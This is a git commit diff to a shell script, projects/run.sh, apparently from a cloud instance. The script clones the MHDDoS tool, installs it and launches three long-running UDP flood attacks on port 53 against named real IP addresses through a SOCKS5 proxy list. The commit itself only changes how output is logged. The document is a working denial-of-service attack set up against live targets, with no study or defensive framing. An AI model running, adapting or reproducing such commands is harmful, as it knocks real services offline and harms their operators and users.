2e4b4348039c5e73499560643fb84c1f25b3d65e
Shamrai Aleksandr <aleksandr.shamrai@together.com>
2022-03-08 17:37:00 +0200

    scr

--- projects/run.sh
+++ projects/run.sh
@@ -8,9 +8,9 @@ git clone https://github.com/MHProDev/MHDDoS.git
 cd MHDDoS
 pip3 install -r requirements.txt
 
-python3 start.py udp 217.175.155.100:53 5 999 socks5.txt 144 36000 > /home/ec2-user/MHDDoS.log &
-python3 start.py udp 217.175.155.12:53 5 999 socks5.txt 144 36000 > /home/ec2-user/MHDDoS.log &
-python3 start.py udp 217.175.140.71:53 5 999 socks5.txt 144 36000 > /home/ec2-user/MHDDoS.log &
+python3 start.py udp 217.175.155.100:53 5 999 socks5.txt 144 36000 > /home/ec2-user/MHDDoS.log 2>&1  &
+python3 start.py udp 217.175.155.12:53 5 999 socks5.txt 144 36000 > /home/ec2-user/MHDDoS.log 2>&1  &
+python3 start.py udp 217.175.140.71:53 5 999 socks5.txt 144 36000 > /home/ec2-user/MHDDoS.log 2>&1  &
 
 sleep 10;
 
